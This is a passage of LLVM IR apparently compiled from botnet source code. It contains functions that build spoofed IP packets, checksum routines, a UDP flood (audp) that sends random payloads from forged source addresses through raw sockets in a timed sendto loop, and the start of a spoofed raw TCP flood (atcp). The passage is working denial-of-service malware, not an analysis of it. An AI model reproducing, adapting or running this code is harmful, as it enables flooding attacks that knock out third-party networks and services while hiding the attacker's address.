  %4 = alloca i32, align 4
  %5 = call i32 @fork() #11
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

8:                                                ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

10:                                               ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias align 16 i8* @malloc(i64 %15) #11
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

18:                                               ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

24:                                               ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

34:                                               ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18, !llvm.loop !24

37:                                               ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #11
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

47:                                               ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local zeroext i16 @csum(i16* %0, i32 %1) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

6:                                                ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

9:                                                ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6, !llvm.loop !25

18:                                               ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

21:                                               ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

28:                                               ; preds = %21, %18
  br label %29

29:                                               ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

33:                                               ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29, !llvm.loop !26

39:                                               ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local zeroext i16 @tcpcsum(%struct.iphdr* %0, %struct.tcphdr* %1) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias align 16 i8* @malloc(i64 %28) #11
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %32, i8* align 8 %33, i64 24, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %36, i8* align 1 %38, i64 20, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #11
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #7

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @makeIPPacket(%struct.iphdr* %0, i32 %1, i32 %2, i8 zeroext %3, i32 %4) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @audp(i8* %0, i32 %1, i32 %2, i32 %3, i32 %4, i32 %5) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i64, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = load i32, i32* %8, align 4
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %36

32:                                               ; preds = %6
  %33 = call i32 @rand_cmwc()
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %41

36:                                               ; preds = %6
  %37 = load i32, i32* %8, align 4
  %38 = trunc i32 %37 to i16
  %39 = call zeroext i16 @htons(i16 zeroext %38) #10
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %41

41:                                               ; preds = %36, %32
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %44 = call i32 @getHost(i8* %42, %struct.in_addr* %43)
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %46, label %47

46:                                               ; preds = %41
  br label %264

47:                                               ; preds = %41
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %49, i8 0, i64 8, i1 false)
  %50 = load i32, i32* %12, align 4
  store i32 %50, i32* %14, align 4
  %51 = load i32, i32* %10, align 4
  %52 = icmp eq i32 %51, 32
  br i1 %52, label %53, label %103

53:                                               ; preds = %47
  %54 = call i32 @socket(i32 2, i32 2, i32 17) #11
  store i32 %54, i32* %15, align 4
  %55 = load i32, i32* %15, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %58, label %57

57:                                               ; preds = %53
  br label %264

58:                                               ; preds = %53
  %59 = load i32, i32* %11, align 4
  %60 = add nsw i32 %59, 1
  %61 = sext i32 %60 to i64
  %62 = call noalias align 16 i8* @malloc(i64 %61) #11
  store i8* %62, i8** %16, align 8
  %63 = load i8*, i8** %16, align 8
  %64 = icmp eq i8* %63, null
  br i1 %64, label %65, label %66

65:                                               ; preds = %58
  br label %264

66:                                               ; preds = %58
  %67 = load i8*, i8** %16, align 8
  %68 = load i32, i32* %11, align 4
  %69 = add nsw i32 %68, 1
  %70 = sext i32 %69 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %67, i8 0, i64 %70, i1 false)
  %71 = load i8*, i8** %16, align 8
  %72 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %71, i32 %72)
  %73 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %74 = load i32, i32* %9, align 4
  %75 = add nsw i32 %73, %74
  store i32 %75, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %76

76:                                               ; preds = %66, %98, %99
  %77 = load i32, i32* %15, align 4
  %78 = load i8*, i8** %16, align 8
  %79 = load i32, i32* %11, align 4
  %80 = sext i32 %79 to i64
  %81 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %82 = call i64 @sendto(i32 %77, i8* %78, i64 %80, i32 0, %struct.sockaddr* %81, i32 16)
  %83 = load i32, i32* %18, align 4
  %84 = load i32, i32* %14, align 4
  %85 = icmp eq i32 %83, %84
  br i1 %85, label %86, label %99

86:                                               ; preds = %76
  %87 = load i32, i32* %8, align 4
  %88 = icmp eq i32 %87, 0
  br i1 %88, label %89, label %93

89:                                               ; preds = %86
  %90 = call i32 @rand_cmwc()
  %91 = trunc i32 %90 to i16
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %91, i16* %92, align 2
  br label %93

93:                                               ; preds = %89, %86
  %94 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %95 = load i32, i32* %17, align 4
  %96 = icmp sgt i32 %94, %95
  br i1 %96, label %97, label %98

97:                                               ; preds = %93
  br label %102

98:                                               ; preds = %93
  store i32 0, i32* %18, align 4
  br label %76

99:                                               ; preds = %76
  %100 = load i32, i32* %18, align 4
  %101 = add i32 %100, 1
  store i32 %101, i32* %18, align 4
  br label %76

102:                                              ; preds = %97
  br label %264

103:                                              ; preds = %47
  %104 = call i32 @socket(i32 2, i32 3, i32 17) #11
  store i32 %104, i32* %19, align 4
  %105 = load i32, i32* %19, align 4
  %106 = icmp ne i32 %105, 0
  br i1 %106, label %108, label %107

107:                                              ; preds = %103
  br label %264

108:                                              ; preds = %103
  store i32 1, i32* %20, align 4
  %109 = load i32, i32* %19, align 4
  %110 = bitcast i32* %20 to i8*
  %111 = call i32 @setsockopt(i32 %109, i32 0, i32 3, i8* %110, i32 4) #11
  %112 = icmp slt i32 %111, 0
  br i1 %112, label %113, label %114

113:                                              ; preds = %108
  br label %264

114:                                              ; preds = %108
  store i32 50, i32* %21, align 4
  br label %115

115:                                              ; preds = %119, %114
  %116 = load i32, i32* %21, align 4
  %117 = add nsw i32 %116, -1
  store i32 %117, i32* %21, align 4
  %118 = icmp ne i32 %116, 0
  br i1 %118, label %119, label %124

119:                                              ; preds = %115
  %120 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %121 = call i32 @rand_cmwc()
  %122 = xor i32 %120, %121
  call void @srand(i32 %122) #11
  %123 = call i32 @rand() #11
  call void @init_rand(i32 %123)
  br label %115, !llvm.loop !27

124:                                              ; preds = %115
  %125 = load i32, i32* %10, align 4
  %126 = icmp eq i32 %125, 0
  br i1 %126, label %127, label %128

127:                                              ; preds = %124
  store i32 0, i32* %22, align 4
  br label %134

128:                                              ; preds = %124
  %129 = load i32, i32* %10, align 4
  %130 = sub nsw i32 32, %129
  %131 = shl i32 1, %130
  %132 = sub nsw i32 %131, 1
  %133 = xor i32 %132, -1
  store i32 %133, i32* %22, align 4
  br label %134

134:                                              ; preds = %128, %127
  %135 = load i32, i32* %11, align 4
  %136 = sext i32 %135 to i64
  %137 = add i64 28, %136
  %138 = call i8* @llvm.stacksave()
  store i8* %138, i8** %23, align 8
  %139 = alloca i8, i64 %137, align 16
  store i64 %137, i64* %24, align 8
  %140 = bitcast i8* %139 to %struct.iphdr*
  store %struct.iphdr* %140, %struct.iphdr** %25, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = getelementptr i8, i8* %142, i64 20
  %144 = bitcast i8* %143 to %struct.udphdr*
  store %struct.udphdr* %144, %struct.udphdr** %26, align 8
  %145 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %146 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %147 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %146, i32 0, i32 0
  %148 = load i32, i32* %147, align 4
  %149 = load i32, i32* %22, align 4
  %150 = call i32 @getRandomIP(i32 %149)
  %151 = call i32 @htonl(i32 %150) #10
  %152 = load i32, i32* %11, align 4
  %153 = sext i32 %152 to i64
  %154 = add i64 8, %153
  %155 = trunc i64 %154 to i32
  call void @makeIPPacket(%struct.iphdr* %145, i32 %148, i32 %151, i8 zeroext 17, i32 %155)
  %156 = load i32, i32* %11, align 4
  %157 = sext i32 %156 to i64
  %158 = add i64 8, %157
  %159 = trunc i64 %158 to i16
  %160 = call zeroext i16 @htons(i16 zeroext %159) #10
  %161 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %162 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %161, i32 0, i32 0
  %163 = bitcast %union.anon.3* %162 to %struct.anon.5*
  %164 = getelementptr inbounds %struct.anon.5, %struct.anon.5* %163, i32 0, i32 2
  store i16 %160, i16* %164, align 2
  %165 = call i32 @rand_cmwc()
  %166 = trunc i32 %165 to i16
  %167 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %168 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %167, i32 0, i32 0
  %169 = bitcast %union.anon.3* %168 to %struct.anon.5*
  %170 = getelementptr inbounds %struct.anon.5, %struct.anon.5* %169, i32 0, i32 0
  store i16 %166, i16* %170, align 2
  %171 = load i32, i32* %8, align 4
  %172 = icmp eq i32 %171, 0
  br i1 %172, label %173, label %175

173:                                              ; preds = %134
  %174 = call i32 @rand_cmwc()
  br label %180

175:                                              ; preds = %134
  %176 = load i32, i32* %8, align 4
  %177 = trunc i32 %176 to i16
  %178 = call zeroext i16 @htons(i16 zeroext %177) #10
  %179 = zext i16 %178 to i32
  br label %180

180:                                              ; preds = %175, %173
  %181 = phi i32 [ %174, %173 ], [ %179, %175 ]
  %182 = trunc i32 %181 to i16
  %183 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 0
  %185 = bitcast %union.anon.3* %184 to %struct.anon.5*
  %186 = getelementptr inbounds %struct.anon.5, %struct.anon.5* %185, i32 0, i32 1
  store i16 %182, i16* %186, align 2
  %187 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %188 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon.3* %188 to %struct.anon.5*
  %190 = getelementptr inbounds %struct.anon.5, %struct.anon.5* %189, i32 0, i32 3
  store i16 0, i16* %190, align 2
  %191 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %192 = bitcast %struct.udphdr* %191 to i8*
  %193 = getelementptr inbounds i8, i8* %192, i64 8
  %194 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %193, i32 %194)
  %195 = bitcast i8* %139 to i16*
  %196 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 2
  %198 = load i16, i16* %197, align 2
  %199 = zext i16 %198 to i32
  %200 = call zeroext i16 @csum(i16* %195, i32 %199)
  %201 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 7
  store i16 %200, i16* %202, align 2
  %203 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %204 = load i32, i32* %9, align 4
  %205 = add nsw i32 %203, %204
  store i32 %205, i32* %27, align 4
  store i32 0, i32* %28, align 4
  br label %206

206:                                              ; preds = %259, %258, %180
  br label %207

207:                                              ; preds = %206
  %208 = load i32, i32* %19, align 4
  %209 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %210 = call i64 @sendto(i32 %208, i8* %139, i64 %137, i32 0, %struct.sockaddr* %209, i32 16)
  %211 = call i32 @rand_cmwc()
  %212 = trunc i32 %211 to i16
  %213 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %214 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %213, i32 0, i32 0
  %215 = bitcast %union.anon.3* %214 to %struct.anon.5*
  %216 = getelementptr inbounds %struct.anon.5, %struct.anon.5* %215, i32 0, i32 0
  store i16 %212, i16* %216, align 2
  %217 = load i32, i32* %8, align 4
  %218 = icmp eq i32 %217, 0
  br i1 %218, label %219, label %221

219:                                              ; preds = %207
  %220 = call i32 @rand_cmwc()
  br label %226

221:                                              ; preds = %207
  %222 = load i32, i32* %8, align 4
  %223 = trunc i32 %222 to i16
  %224 = call zeroext i16 @htons(i16 zeroext %223) #10
  %225 = zext i16 %224 to i32
  br label %226

226:                                              ; preds = %221, %219
  %227 = phi i32 [ %220, %219 ], [ %225, %221 ]
  %228 = trunc i32 %227 to i16
  %229 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %230 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %229, i32 0, i32 0
  %231 = bitcast %union.anon.3* %230 to %struct.anon.5*
  %232 = getelementptr inbounds %struct.anon.5, %struct.anon.5* %231, i32 0, i32 1
  store i16 %228, i16* %232, align 2
  %233 = call i32 @rand_cmwc()
  %234 = trunc i32 %233 to i16
  %235 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %236 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %235, i32 0, i32 3
  store i16 %234, i16* %236, align 4
  %237 = load i32, i32* %22, align 4
  %238 = call i32 @getRandomIP(i32 %237)
  %239 = call i32 @htonl(i32 %238) #10
  %240 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 8
  store i32 %239, i32* %241, align 4
  %242 = bitcast i8* %139 to i16*
  %243 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 2
  %245 = load i16, i16* %244, align 2
  %246 = zext i16 %245 to i32
  %247 = call zeroext i16 @csum(i16* %242, i32 %246)
  %248 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %249 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %248, i32 0, i32 7
  store i16 %247, i16* %249, align 2
  %250 = load i32, i32* %28, align 4
  %251 = load i32, i32* %14, align 4
  %252 = icmp eq i32 %250, %251
  br i1 %252, label %253, label %259

253:                                              ; preds = %226
  %254 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %255 = load i32, i32* %27, align 4
  %256 = icmp sgt i32 %254, %255
  br i1 %256, label %257, label %258

257:                                              ; preds = %253
  br label %262

258:                                              ; preds = %253
  store i32 0, i32* %28, align 4
  br label %206

259:                                              ; preds = %226
  %260 = load i32, i32* %28, align 4
  %261 = add i32 %260, 1
  store i32 %261, i32* %28, align 4
  br label %206

262:                                              ; preds = %257
  %263 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %263)
  br label %264

264:                                              ; preds = %46, %57, %65, %107, %113, %262, %102
  ret void
}

declare i32 @time(...) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #6

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #1

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.stackrestore(i8*) #6

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @atcp(i8* %0, i32 %1, i32 %2, i32 %3, i8* %4, i32 %5, i32 %6) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i64, align 8
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.tcphdr*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %27 = load i32, i32* %14, align 4
  store i32 %27, i32* %15, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %9, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

31:                                               ; preds = %7
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

35:                                               ; preds = %7
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #10
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

40:                                               ; preds = %35, %31
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  br label %333

46:                                               ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %48, i8 0, i64 8, i1 false)
  %49 = call i32 @socket(i32 2, i32 3, i32 6) #11
  store i32 %49, i32* %17, align 4
  %50 = load i32, i32* %17, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %53, label %52

52:                                               ; preds = %46
  br label %333

53:                                               ; preds = %46
  store i32 1, i32* %18, align 4
  %54 = load i32, i32* %17, align 4
  %55 = bitcast i32* %18 to i8*
  %56 = call i32 @setsockopt(i32 %54, i32 0, i32 3, i8* %55, i32 4) #11
  %57 = icmp slt i32 %56, 0
  br i1 %57, label %58, label %59

58:                                               ; preds = %53
  br label %333

59:                                               ; preds = %53
  %60 = load i32, i32* %11, align 4
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %62, label %63

62:                                               ; preds = %59
  store i32 0, i32* %19, align 4
  br label %69

63:                                               ; preds = %59
  %64 = load i32, i32* %11, align 4
  %65 = sub nsw i32 32, %64
